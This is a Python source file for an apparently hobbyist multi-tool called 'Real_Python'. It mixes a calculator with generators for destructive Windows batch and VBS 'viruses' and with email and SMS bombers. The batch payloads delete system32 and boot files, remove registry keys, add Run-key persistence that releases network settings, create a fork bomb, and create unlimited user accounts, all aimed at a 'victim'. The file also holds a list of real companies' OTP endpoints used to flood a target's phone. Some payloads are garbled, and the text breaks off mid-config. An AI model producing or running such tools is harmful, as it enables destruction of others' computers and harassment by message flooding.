import time
from os import system, name
import os
import sys
import pip
import threading
import smtplib  #
import os  #
import string  #
from concurrent.futures import ThreadPoolExecutor, as_completed  #
import json  #
from math import *  #
import random  #
from random import *  #
from turtle import *  #
from tkinter import *  #
import base64  #
import datetime  #
from datetime import datetime  #
from datetime import date  #
import io
import urllib


def clear1():
    try:
        if name == 'nt':
            system('cls')
        else:
            system('clear')
    except:
        pass


dot_printing_time = 0
value_dat = 0


def print_dot():
    a = 0
    while dot_printing_time == 0:
        time.sleep(1)
        a = a + 1
        b = ("Installing Module" + "." * a + "Plz Wait")
        print(b)
        clear1()
        if a >= 5:
            print_dot()

    else:
        sys.exit()


def retry():
    threading.Thread(target=print_dot).start()
    global dot_printing_time
    test_list = ["pip", "PySimpleGUI==4.16.0", "argparse", "requests", "colorama", "wget==3.2",
                 "turtle", "cffi","qrcode","image"]
    number_of_module = len(test_list)
    for a in range(number_of_module):
        pip.main(['install'] + test_list + ['--upgrade'])
        res = " ".join(test_list)
        module_size = 0
        print("Installed: ", test_list.pop(module_size))
        module_size = module_size + 1
    dot_printing_time = 1
    print("Module install Successful, Plz Rerun This Code")
    print("Module install Successful, Plz Rerun This Code")
    print("Module install Successful, Plz Rerun This Code")
    print("Module install Successful, Plz Rerun This Code")
    time.sleep(3)
    sys.exit()


try:
    import PySimpleGUI as sg
    import argparse
    import requests
    import colorama
    from colorama import Fore, Style
    import wget
    from cffi.setuptools_ext import execfile
    import turtle
    from turtle import *
    import qrcode
    import image

    print("Module Import Successful")
    time.sleep(1)
    clear1()
except ModuleNotFoundError:
    retry()


def contact():
    print(Fore.YELLOW + "Primary Email: xcoder.info@gmail.com\n"
                        "Secondary Email: info.realpython@gmail.com\n"
                        "Website for contacting us: https://form.craftbook.xyz\n"
                        "YouTube: In_Future_World and Craft Book\n"
                        "Instagram: In_Future_World\n"
                        "Twitter: In_Future_World\n"
                        "GitHub: code-with-Xcoder\n")


answer = 0
score = 0
margin = 4
scoreLeft = 0
scoreRight = 0
maxScore = 20
zip_number = 0


def real_python():
    def banner():
        banner1 = Fore.BLUE + '''
     ____            _     ____        _   _                 
    |  _ \ ___  __ _| |   |  _ \ _   _| |_| |__   ___  _ __  
    | |_) / _ \/ _` | |   | |_) | | | | __| '_ \ / _ \| '_ \ 
    |  _ <  __/ (_| | |   |  __/| |_| | |_| | | | (_) | | | |
    |_| \_\___|\__,_|_|___|_|    \__, |\__|_| |_|\___/|_| |_|
                     |_____|     |___/                       
        '''
        print(banner1)

    banner()

    def check_for_update():
        print("Checking for Update......")
        # threading.Thread(target=print_dot1).start()
        global zip_number
        zip_number = 1

        def update_now():
            print(Fore.BLUE + "Press y for update it now \n"
                              "Press enter to continue")
            update_com = input("Enter choise: ")
            if update_com == "y" or update_com == "Y":
                os.system('termux-open-url https://github.com/code-with-Xcoder/Real_Python.git')
                clear1()
                banner()
                sys.exit()
            else:
                clear1()
                banner()
                pass
            pass


        try:
            read_file = io.open(".version", "r", encoding="utf-8")
            read_text = read_file.read()
            url = "https://github.com/code-with-Xcoder/Real_Python/raw/master/.version"
            file = urllib.request.urlopen(url)
            for line in file:
                decoded_line = line.decode("utf-8")

            if (read_text == decoded_line):
                print(Fore.YELLOW + "Real_Python is upto date"
                                    "\nYour Version: ", read_text, "\n")
                time.sleep(1)
                del (file)
                clear1()
                banner()
                pass
            if (read_text < decoded_line):
                print(Fore.RED + "New version of Real_Python is Available")
                print(" Your Version: ", read_text,
                      "\nAvailable version: ", decoded_line)
                update_now()
                del (file)
                pass
        except FileNotFoundError:
            print(Fore.RED + "Version file not found........!\n"
                             "PLz, reinstall Your Package")
    if zip_number == 0:
        check_for_update()
    else:
        pass

    def create_folder():
        path = "Your_data/Bat_virus/Simple_bat_Virus/"
        path1 = "Your_data/Bat_virus/Dangerous_bat_Virus/"
        path2 = "Your_data/Your_Qr_Code/"
        path3 = "Your_data/Your_Downloaded_Files/"


        if not os.path.exists(path):
            os.makedirs(path)
        if not os.path.exists(path1):
            os.makedirs(path1)
        if not os.path.exists(path2):
            os.makedirs(path2)
        if not os.path.exists(path3):
            os.makedirs(path3)
    def web():
        os.system('termux-open-url http://form.craftbook.xyz')
    def check_internet():
        try:
            requests.get("https://google.com")
            return True
        except Exception:
            return False

    contact()
    time.sleep(2)
    print(Fore.GREEN + "1 For Launch Calculator. \n"
                       "2 For Funny And Dangerous .bat and .vbs Virus.\n"
                       "3 For Launch Bomber(SMS,CALL,MAIL).\n"                       
                       "4 For Convert url or secret text in QrCode.\n"
                       "5 For Open Any application or file by it's Location.\n"
                       "6 For install Many Python Module at One Time By Only it's Name.\n"
                       "7 For Downloading File or Video Or Anything.\n"                       
                       "8 For Know How old You are.\n" +
          Fore.RED + "Press y to Fill Form for New Feature or Contact or Give us Suggestion")

    def full():

        create_folder()

        def calculator():
            answer = 0

            def addition(a):
                global answer
                answer = answer + a

            def substrction(a):
                global answer
                answer = answer - a

            def divide(a):
                global answer
                answer = answer / a

            def multyply(a):
                global answer
                answer = answer * a

            def divide2(a):
                global answer
                answer = answer // a

            def multyply2(a):
                global answer
                answer = answer ** a

            def percent(a):
                global answer
                answer = answer % a

            def help():
                contact()
                print(Fore.GREEN + "Enter any float Number and in Symbol, these are allowed:\n"
                                   "(/, *, -, +, %, //, **)\n"
                                   "1- First input Numbers\n"
                                   "2- input sign\n"
                                   "3- again input number\n"
                                   "4- input number or input (=) for allover output\n"
                                   "Example:\n"
                                   "Enter Number: 5\n"
                                   "Enter Sign: *\n"
                                   "Enter Number: 4\n"
                                   "20.0\n"
                                   "Enter Sign: =\n"
                                   "Result: \n"
                                   "5.0 * 4.0 \n"
                                   "Total:  20.0\n")

            print(Fore.GREEN + "Press h for help\n"
                               "Press y to fill form for new sign and feature")

            list_1 = []

            def all():
                global answer
                user_input = input("Enter Number: ")
                if user_input == "h" or user_input == "H":
                    help()
                    all()
                if user_input == "y" or user_input == "Y":
                    web()
                    all()
                else:
                    try:
                        user_input = float(user_input)
                    except ValueError:
                        print("Error: Input Only Number")
                        all()
                    answer = answer + user_input
                    list_1.append(user_input)

                    def sign():
                        global answer
                        user_input_sign = input("Enter Sign: ")
                        if user_input_sign == "h" or user_input_sign == "H":
                            help()
                            sign()
                        else:
                            if user_input_sign == "+":
                                def add():
                                    user_input = input("Enter Number: ")
                                    if user_input == "h" or user_input == "H":
                                        help()
                                        sign()
                                    if user_input == "y" or user_input == "Y":
                                        web()
                                        sign()
                                    else:
                                        try:
                                            user_input = float(user_input)
                                        except ValueError:
                                            print("Error: input only numbers")
                                            add()
                                        addition(user_input)
                                        list_1.append("+"), list_1.append(user_input)
                                        print(answer)
                                        sign()

                                add()
                            if user_input_sign == "-":
                                def subs():
                                    user_input = input("Enter Number: ")
                                    if user_input == "h" or user_input == "H":
                                        help()
                                        sign()
                                    if user_input == "y" or user_input == "Y":
                                        web()
                                        sign()
                                    else:
                                        try:
                                            user_input = float(user_input)
                                        except ValueError:
                                            print("Error: input only numbers")
                                            subs()
                                        substrction(user_input)
                                        list_1.append("-"), list_1.append(user_input)
                                        print(answer)
                                        sign()

                                subs()
                            if user_input_sign == "/":
                                def div():
                                    user_input = input("Enter Number: ")
                                    if user_input == "h" or user_input == "H":
                                        help()
                                        sign()
                                    if user_input == "y" or user_input == "Y":
                                        web()
                                        sign()
                                    else:
                                        try:
                                            user_input = float(user_input)
                                        except ValueError:
                                            print("Error: input only numbers")
                                            div()
                                        divide(user_input)
                                        list_1.append("/"), list_1.append(user_input)
                                        print(answer)
                                        sign()

                                div()
                            if user_input_sign == "*" or user_input_sign == "x":
                                def multy():
                                    user_input = input("Enter Number: ")
                                    if user_input == "h" or user_input == "H":
                                        help()
                                        sign()
                                    if user_input == "y" or user_input == "Y":
                                        web()
                                        sign()
                                    else:
                                        try:
                                            user_input = float(user_input)
                                        except ValueError:
                                            print("Error: input only numbers")
                                            multy()
                                        multyply(user_input)
                                        list_1.append("*"), list_1.append(user_input)
                                        print(answer)
                                        sign()

                                multy()
                                print(answer)
                            if user_input_sign == "//":
                                def div2():
                                    user_input = input("Enter Number: ")
                                    if user_input == "h" or user_input == "H":
                                        help()
                                        sign()
                                    if user_input == "y" or user_input == "Y":
                                        web()
                                        sign()
                                    else:
                                        try:
                                            user_input = float(user_input)
                                        except ValueError:
                                            print("Error: input only numbers")
                                            div2()
                                        divide2(user_input)
                                        list_1.append("+"), list_1.append(user_input)
                                        print(answer)
                                        sign()

                                div2()
                                print(answer)
                            if user_input_sign == "**" or user_input_sign == "xx":
                                def multy2():
                                    user_input = input("Enter Number: ")
                                    if user_input == "h" or user_input == "H":
                                        help()
                                        sign()
                                    if user_input == "y" or user_input == "Y":
                                        web()
                                        sign()
                                    else:
                                        try:
                                            user_input = float(user_input)
                                        except ValueError:
                                            print("Error: input only numbers")
                                            multy2()
                                        multyply2(user_input)
                                        list_1.append("**"), list_1.append(user_input)
                                        print(answer)
                                        sign()

                                multy2()
                                print(answer)
                            if user_input_sign == "%":
                                def perc():
                                    user_input = input("Enter Number: ")
                                    if user_input == "h" or user_input == "H":
                                        help()
                                        sign()
                                    if user_input == "y" or user_input == "Y":
                                        web()
                                        sign()
                                    else:
                                        try:
                                            user_input = float(user_input)
                                        except ValueError:
                                            print("Error: input only numbers")
                                            perc()
                                        percent(user_input)
                                        list_1.append("%"), list_1.append(user_input)
                                        print(answer)
                                        sign()

                                perc()
                            if user_input_sign == "=":
                                print("Result: ")
                                # print(list_1," = ",)
                                for a in range(len(list_1)):
                                    print(list_1[a], end=' ')
                                print("\n"
                                      "Total: ", answer)
                                exit = input("Enter something for Main Menu : ")
                                real_python()

                            else:
                                print("Error: Only These sing are Allowed - (/,*,-,+)")
                                sign()

                    sign()

            all()

        def bat():
            print(Fore.GREEN + "Press 1 for Simple or Funny Virus.\n"
                               "Press 2 for Dangerous Virus.")
            bat_input = input("Input: ")
            if bat_input == "1":
                print(Fore.GREEN + "1 - To Create The Matrix Rain In Command Prompt\n"
                                   "2 - To Endless Pressing Enter\n"
                                   "3 - Virus that continuously eject CD/DVD drives\n"
                                   "4 - Continuously type a message at any writable place on screen-VBS Trick\n"
                                   "5 - Shutdown Your Friends Computer with your Message\n"
                                   "6 - For notepad Personal dairy \n"
                                   "7 - Unlimited Background Process Creator\n"
                                   "8 - Toggle your friend’s Caps Lock button simultaneously")

                def simple_bat_1():
                    try:
                        f = open("Your_data/Bat_virus/Simple_bat_Virus/simple_bat_1.bat", "w")
                    except FileExistsError:
                        create_folder()
                        simple_bat_1()

                    f.write("@ECHO off\n"
                            "COLOR 02\n"
                            ":START\n"
                            "ECHO %RANDOM% %RANDOM%%RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM%\n"
                            "GOTO START")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def simple_bat_2():
                    try:
                        f = open("Your_data/Bat_virus/Simple_bat_Virus/simple_bat_2.bat", "w")
                    except FileExistsError:
                        create_folder()
                        simple_bat_2()
                    f.write("Set\n"
                            "wshShell = wscript.CreateObject(”WScript.Shell”)\n"
                            "do\n"
                            "wscript.sleep\n"
                            "wscript.sleep\n"
                            "100\n"
                            "wshshell.sendkeys “~(enter)”\n"
                            "loop")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def simple_bat_3():
                    try:
                        f = open("Your_data/Bat_virus/Simple_bat_Virus/simple_bat_3.vbs", "w")
                    except FileExistsError:
                        create_folder()
                        simple_bat_3()
                    f.write("Set oWMP = CreateObject('WMPlayer.OCX.7')\n"
                            "Set colCDROMs = oWMP.cdromCollection\n"
                            "do\n"
                            "if colCDROMs.Count >= 1 then\n"
                            "For i = 0 to colCDROMs.Count - 1\n"
                            "colCDROMs.Item(i).Eject\n"
                            "Next\n"
                            "For i = 0 to colCDROMs.Count - 1\n"
                            "colCDROMs.Item(i).Eject\n"
                            "Next\n"
                            "End If\n"
                            "wscript.sleep 5000\n"
                            "loop")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def simple_bat_4():
                    try:
                        f = open("Your_data/Bat_virus/Simple_bat_Virus/simple_bat_4.vbs", "w")
                    except FileExistsError:
                        create_folder()
                        simple_bat_4()
                    user_message = input("Enter Your Massage for unlimited PopUp - ")
                    f.write('Set wshShell = wscript.CreateObject("WScript.Shell")\n'
                            'do\n'
                            'wscript.sleep 100\n'
                            'wshshell.sendkeys ' + '"' + user_message + '"\n' + 'loop')

                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def simple_bat_5():
                    try:
                        f = open("Your_data/Bat_virus/Simple_bat_Virus/simple_bat_5.bat", "w")
                    except FileExistsError:
                        create_folder()
                        simple_bat_5()
                    user_message = input("Enter Your message During ShutDown - ")
                    f.write('@ECHO OFF\n'
                            'MSG * ITS TIME TO GET SOME REST.\n'
                            'SHUTDOWN -C ' + '"' + user_message + '"' + ' -S')
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def simple_bat_6():
                    try:
                        f = open("Your_data/Bat_virus/Simple_bat_Virus/simple_txt_dairy_6.txt", "w")
                    except FileExistsError:
                        create_folder()
                        simple_bat_6()
                    f.write(".LOG")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def simple_bat_7():
                    try:
                        f = open("Your_data/Bat_virus/Simple_bat_Virus/simple_bat_7.bat", "w")
                    except FileExistsError:
                        create_folder()
                        simple_bat_7()
                    f.write("%0|%0")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def simple_bat_input():
                    simple_bat_input_user = input("Input: ")
                    if simple_bat_input_user == "1":
                        simple_bat_1()
                    if simple_bat_input_user == "2":
                        simple_bat_2()
                    if simple_bat_input_user == "3":
                        simple_bat_3()
                    if simple_bat_input_user == "4":
                        simple_bat_4()
                    if simple_bat_input_user == "5":
                        simple_bat_5()
                    if simple_bat_input_user == "6":
                        simple_bat_6()
                    if simple_bat_input_user == "7":
                        simple_bat_7()
                    else:
                        print("Error: Input only given number")
                        simple_bat_input()

                simple_bat_input()
            if bat_input == "2":
                print(
                    Fore.GREEN + "1 - Launch (winword, mspaint, notepad, write, cmd, explorer, control, calc) for infinity times\n"
                                 "2 - Delete system32 forever (you can't able to start your computer\n"
                                 "3 - Disable Internet Permanently\n"
                                 "4 - Remove Entire Registry Key\n"
                                 "5 - Create Unlimited numbers of Folder and user account\n"
                                 "6 - Create Unlimited User Account in his pc \n"
                                 "7 - Create Unlimited Background Process in Victim pc\n"
                                 "8 - Delete Victims whole C:\ drive (this is unrecoverable)\n"
                                 "9 - Disable Antivirus(all) of Victim Computer\n"
                                 "10 - Crash PC forever\n"

                                 "")

                def dang_bat_1():
                    try:
                        f = open("Your_data/Bat_virus/Dangerous_bat_Virus/dang_bat_1.bat", "w")
                    except FileExistsError:
                        create_folder()
                        dang_bat_1()
                    f.write("@echo off\n"
                            "start winword\n"
                            "start mspaint\n"
                            "start notepad\n"
                            "start write\n"
                            "start cmd\n"
                            "start explorer\n"
                            "start control\n"
                            "start calc\n"
                            "goto x")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def dang_bat_2():
                    try:
                        f = open("Your_data/Bat_virus/Dangerous_bat_Virus/dang_bat_2.bat", "w")
                    except FileExistsError:
                        create_folder()
                        dang_bat_2()
                    f.write("del c:WINDOWSsystem32*.*/q")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def dang_bat_3():
                    try:
                        f = open("Your_data/Bat_virus/Dangerous_bat_Virus/dang_bat_3.bat", "w")
                    except FileExistsError:
                        create_folder()
                        dang_bat_3()
                    f.write("echo @echo off>c:windowswimn32.bat\n"
                            "echo break off>>c:windowswimn32.bat\n"
                            "echo ipconfig/release_all>>c:windowswimn32.bat\n"
                            "echo end>>c:windowswimn32.bat reg\n"
                            "add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d :windowswimn32.bat /f reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f\n"
                            "echo Disable ! PAUSE")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def dang_bat_4():
                    try:
                        f = open("Your_data/Bat_virus/Dangerous_bat_Virus/dang_bat_4.bat", "w")
                    except FileExistsError:
                        create_folder()
                        dang_bat_4()
                    f.write("@echo off\n"
                            "START reg delete HKCR/.exe\n"
                            "START reg delete HKCR/.dll\n"
                            "START reg delete HKCR/*")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def dang_bat_5():
                    try:
                        f = open("Your_data/Bat_virus/Dangerous_bat_Virus/dang_bat_5.bat", "w")
                        f1 = open("Your_data/Bat_virus/Dangerous_bat_Virus/dang_bat_5_1.bat", "w")
                    except FileExistsError:
                        create_folder()
                        dang_bat_5()
                    f.write("@echo off\n"
                            ":x\n"
                            "md %random%\n"
                            "goto x")
                    f1.write("@echo off\n"
                             ":xnet\n"
                             "user %random% /add\n"
                             "goto x ")

                    f.close()
                    f1.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def dang_bat_10():
                    try:
                        f = open("Your_data/Bat_virus/Dangerous_bat_Virus/dang_bat_10.bat", "w")
                    except FileExistsError:
                        create_folder()
                        dang_bat_10()
                    f.write("@echo off\n"
                            "attrib -r -s -h c:autoexec.bat\n"
                            "del c:autoexec.bat\n"
                            "attrib -r -s -h c:boot.ini\n"
                            "del c:boot.ini\n"
                            "attrib -r -s -h c:ntldr\n"
                            "del c:ntldr\n"
                            "attrib -r -s -h c:windowswin.ini\n"
                            "del c:windowswin.ini")
                    f.close()
                    contact()
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                    time.sleep(2)
                    bat()

                def dang_bat_input():
                    dang_bat_input_user = input("Input: ")
                    if dang_bat_input_user == "1":
                        dang_bat_1()
                    if dang_bat_input_user == "10":
                        dang_bat_10()
                    else:
                        print("Error: Input only given number")
                        dang_bat_input()

                dang_bat_input()
            if bat_input == "":
                real_python()
            else:
                print("Error: input given number")
                bat()

        def bomber():
            print(Fore.RED + "Some Bomber Code are Taken from Tbomb \n"
                             "Thanks to SpeedX for Helping")

            def get_mail_info():
                a = 0
                try:
                    input_email = str(input(Fore.GREEN + "Enter Your email: "))
                    input_password = str(input(Fore.GREEN + "Enter Your email Password: "))
                    input_to = input(Fore.GREEN + "Enter receiver email:  ")
                    input_subject = input(Fore.GREEN + "Enter Subject OF Email: ")
                    input_message = input(Fore.GREEN + "Enter Message: ")
                    input_time = int(input(Fore.GREEN + "Enter Numbers of times: "))
                    massege_mail = 'Subject: {}\n\n{}'.format(input_subject, input_message)
                except ValueError:
                    print(Fore.RED + "Error: Input Correctly")
                    get_mail_info()
                for x in range(input_time):
                    try:
                        mail = smtplib.SMTP('smtp.gmail.com', 587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(input_email, input_password)
                        mail.sendmail(input_email, input_to, massege_mail)
                        a = a + 1
                        print(Fore.GREEN + "Sent: ", a)
                        print(Fore.GREEN + "message sent to {}".format(input_to))
                    except ValueError:
                        print(Fore.RED + "Something Went Wrong, plz try again")
                        get_mail_info()
                mail.close()
                real_python()

            def version():
                "2.1.2"

            isdcodes = {
                "93": "AF",
                "355": "AL",
                "213": "DZ",
                "376": "AD",
                "244": "AO",
                "672": "AQ",
                "54": "AR",
                "374": "AM",
                "297": "AW",
                "61": "AU",
                "43": "AT",
                "994": "AZ",
                "973": "BH",
                "880": "BD",
                "375": "BY",
                "32": "BE",
                "501": "BZ",
                "229": "BJ",
                "975": "BT",
                "591": "BO",
                "387": "BA",
                "267": "BW",
                "55": "BR",
                "246": "IO",
                "673": "BN",
                "359": "BG",
                "226": "BF",
                "257": "BI",
                "855": "KH",
                "237": "CM",
                "238": "CV",
                "236": "CF",
                "235": "TD",
                "56": "CL",
                "86": "CN",
                "57": "CO",
                "269": "KM",
                "682": "CK",
                "506": "CR",
                "385": "HR",
                "53": "CU",
                "599": "AN",
                "357": "CY",
                "420": "CZ",
                "243": "CD",
                "45": "DK",
                "253": "DJ",
                "670": "TL",
                "593": "EC",
                "20": "EG",
                "503": "SV",
                "240": "GQ",
                "291": "ER",
                "372": "EE",
                "251": "ET",
                "500": "FK",
                "298": "FO",
                "679": "FJ",
                "358": "FI",
                "33": "FR",
                "689": "PF",
                "241": "GA",
                "220": "GM",
                "995": "GE",
                "49": "DE",
                "233": "GH",
                "350": "GI",
                "30": "GR",
                "299": "GL",
                "502": "GT",
                "224": "GN",
                "245": "GW",
                "592": "GY",
                "509": "HT",
                "504": "HN",
                "852": "HK",
                "36": "HU",
                "354": "IS",
                "91": "IN",
                "62": "ID",
                "98": "IR",
                "964": "IQ",
                "353": "IE",
                "972": "IL",
                "39": "IT",
                "225": "CI",
                "81": "JP",
                "962": "JO",
                "254": "KE",
                "686": "KI",
                "383": "XK",
                "965": "KW",
                "996": "KG",
                "856": "LA",
                "371": "LV",
                "961": "LB",
                "266": "LS",
                "231": "LR",
                "218": "LY",
                "423": "LI",
                "370": "LT",
                "352": "LU",
                "853": "MO",
                "389": "MK",
                "261": "MG",
                "265": "MW",
                "60": "MY",
                "960": "MV",
                "223": "ML",
                "356": "MT",
                "692": "MH",
                "222": "MR",
                "230": "MU",
                "262": "RE",
                "52": "MX",
                "691": "FM",
                "373": "MD",
                "377": "MC",
                "976": "MN",
                "382": "ME",
                "212": "EH",
                "258": "MZ",
                "95": "MM",
                "264": "NA",
                "674": "NR",
                "977": "NP",
                "31": "NL",
                "687": "NC",
                "64": "NZ",
                "505": "NI",
                "227": "NE",
                "234": "NG",
                "683": "NU",
                "850": "KP",
                "47": "SJ",
                "968": "OM",
                "92": "PK",
                "680": "PW",
                "970": "PS",
                "507": "PA",
                "675": "PG",
                "595": "PY",
                "51": "PE",
                "63": "PH",
                "48": "PL",
                "351": "PT",
                "974": "QA",
                "242": "CG",
                "40": "RO",
                "7": "RU",
                "250": "RW",
                "590": "MF",
                "290": "SH",
                "508": "PM",
                "685": "WS",
                "378": "SM",
                "239": "ST",
                "966": "SA",
                "221": "SN",
                "381": "RS",
                "248": "SC",
                "232": "SL",
                "65": "SG",
                "421": "SK",
                "386": "SI",
                "677": "SB",
                "252": "SO",
                "27": "ZA",
                "82": "KR",
                "211": "SS",
                "34": "ES",
                "94": "LK",
                "249": "SD",
                "597": "SR",
                "268": "SZ",
                "46": "SE",
                "41": "CH",
                "963": "SY",
                "886": "TW",
                "992": "TJ",
                "255": "TZ",
                "66": "TH",
                "228": "TG",
                "690": "TK",
                "676": "TO",
                "216": "TN",
                "90": "TR",
                "993": "TM",
                "688": "TV",
                "256": "UG",
                "380": "UA",
                "971": "AE",
                "44": "GB",
                "1": "US",
                "598": "UY",
                "998": "UZ",
                "678": "VU",
                "379": "VA",
                "58": "VE",
                "84": "VN",
                "681": "WF",
                "967": "YE",
                "260": "ZM",
                "263": "ZW"
            }
            dd = isdcodes.keys()

            def json_data():
                global true
                global false
                {
                    "contributors": [
                        "Xcoder",
                        "Prant Keshari",
                        "Real_Python"
                    ],
                    "version": "2.3",
                    "sms": {
                        "91": [
                            {
                                "name": "confirmtkt",
                                "method": "GET",
                                "url": "https://securedapi.confirmtkt.com/api/platform/register",
                                "params": {
                                    "newOtp": "true",
                                    "mobileNumber": "{target}"
                                },
                                "identifier": "false"
                            },
                            {
                                "name": "justdial",
                                "method": "GET",
                                "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
                                "params": {
                                    "mobile": "{target}"
                                },
                                "identifier": "sent"
                            },
                            {
                                "name": "frotels",
                                "method": "POST",
                                "url": "https://www.frotels.com/appsendsms.php",
                                "data": {
                                    "mobno": "{target}"
                                },
                                "identifier": "sent"
                            },
                            {
                                "name": "gapoon",
                                "method": "POST",
                                "url": "https://www.gapoon.com/userSignup",
                                "data": {
                                    "mobile": "{target}",
                                    "email": "noreply@gmail.com",
                                    "name": "LexLuthor"
                                },
                                "identifier": "1"
                            },
                            {
                                "name": "housing",
                                "method": "POST",
                                "url": "https://login.housing.com/api/v2/send-otp",
                                "data": {
                                    "phone": "{target}"
                                },
                                "identifier": "Sent"
                            },
                            {
                                "name": "porter",
                                "method": "POST",
                                "url": "https://porter.in/restservice/send_app_link_sms",
                                "data": {
                                    "phone": "{target}",
                                    "referrer_string": "",
                                    "brand": "porter"
                                },
                                "identifier": "true"
                            },
                            {
                                "name": "cityflo",
                                "method": "POST",
                                "url": "https://cityflo.com/website-app-download-link-sms/",
                                "data": {
                                    "mobile_number": "{target}"
                                },
                                "identifier": "sent"
                            },
                            {
                                "name": "nnnow",
                                "method": "POST",
                                "url": "https://api.nnnow.com/d/api/appDownloadLink",
                                "data": {
                                    "mobileNumber": "{target}"
                                },
                                "identifier": "true"
                            },
                            {
                                "name": "ajio",
                                "method": "POST",
                                "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
                                "data": {
                                    "firstName": "xxps",
                                    "login": "wiqpdl223@wqew.com",
                                    "password": "QASpw@1s",
                                    "genderType": "Male",
                                    "mobileNumber": "{target}",
                                    "requestType": "SENDOTP"
                                },
                                "identifier": "1"
                            },
                            {
                                "name": "happyeasygo",
                                "method": "GET",
                                "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
                                "params": {
                                    "phone": "91%20{target}"
                                },
                                "identifier": "true"
                            },
                            {
                                "name": "unacademy",
                                "method": "POST",
                                "url": "https://unacademy.com/api/v1/user/get_app_link/",
                                "data": {
                                    "phone": "{target}"
                                },
                                "identifier": "sent"
                            },
                            {
                                "name": "treebo",
                                "method": "POST",
                                "url": "https://www.treebo.com/api/v2/auth/login/otp/",
                                "data": {
                                    "phone_number": "{target}"
                                },
                                "identifier": "sent"
                            },
                            {
                                "name": "airtel",
                                "method": "GET",
                                "url": "https://www.airtel.in/referral-api/core/notify",
                                "params": {
                                    "messageId": "map",
                                    "rtn": "{target}"
                                },
                                "identifier": "Success"
                            },
                            {
                                "name": "pharmeasy",
                                "method": "POST",
                                "url": "https://pharmeasy.in/api/auth/requestOTP",
                                "json": {
                                    "contactNumber": "{target}"
                                },
                                "identifier": "resendSmsCounter"
                            },
                            {
                                "name": "mylescars",
                                "method": "POST",
                                "url": "https://www.mylescars.com/usermanagements/chkContact",
                                "data": {
                                    "contactNo": "{target}"
                                },
                                "identifier": "success@::::"
                            },
                            {
                                "name": "grofers",
                                "method": "POST",
                                "url": "https://grofers.com/v2/accounts/",
                                "data": {
                                    "user_phone": "{target}"
                                },
                                "headers": {
                                    "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
                                },
                                "identifier": "We have sent"
                            },
                            {
                                "name": "dream11",
                                "method": "POST",
                                "url": "https://api.dream11.com/sendsmslink",
                                "data": {
                                    "siteId": "1",
                                    "mobileNum": "{target}",
                                    "appType": "androidfull"
                                },
                                "identifier": "true"
                            },
                            {
                                "name": "cashify",
                                "method": "GET",
                                "url": "https://www.cashify.in/api/cu01/v1/app-link",
                                "params": {
                                    "mn": "{target}"
                                },
                                "identifier": "Successfully"
                            },
                            {
                                "name": "paytm",
                                "method": "POST",
                                "url": "https://commonfront.paytm.com/v4/api/sendsms",
                                "data": {
                                    "phone": "{target}",
                                    "guid": "2952fa812660c58dc160ca6c9894221d"
                                },
                                "identifier": "202"
                            },
                            {
                                "name": "kfc-in",
                                "method": "POST",
                                "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
                                "headers": {
                                    "Referer": "https://online.kfc.co.in/login",
                                    "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
                                },
                                "json": {
                                    "AuthorizedFor": "3",
                                    "phoneNumber": "{target}",
                                    "Resend": "false"
                                },
                                "identifier": "true"
                            },
                            {
                                "name": "indialends",
                                "method": "POST",
                                "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
                                "cookies": {
                                    "_ga": "GA1.2.1483885314.1559157646",
                                    "_fbp": "fb.1.1559157647161.1989205138",
                                    "TiPMix": "91.9909185226964",
                                    "gcb_t_track": "SEO - Google",
                                    "gcb_t_keyword": "",
                                    "gcb_t_l_url": "https://www.google.com/",
                                    "gcb_utm_medium": "",
                                    "gcb_utm_campaign": "",
                                    "ASP.NET_SessionId": "ioqkek5lbgvldlq4i3cmijcs",
                                    "web_app_landing_utm_source": "",
                                    "web_app_landing_url": "/personal-loan",
                                    "webapp_landing_referral_url": "https://www.google.com/",
                                    "ARRAffinity": "747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417",
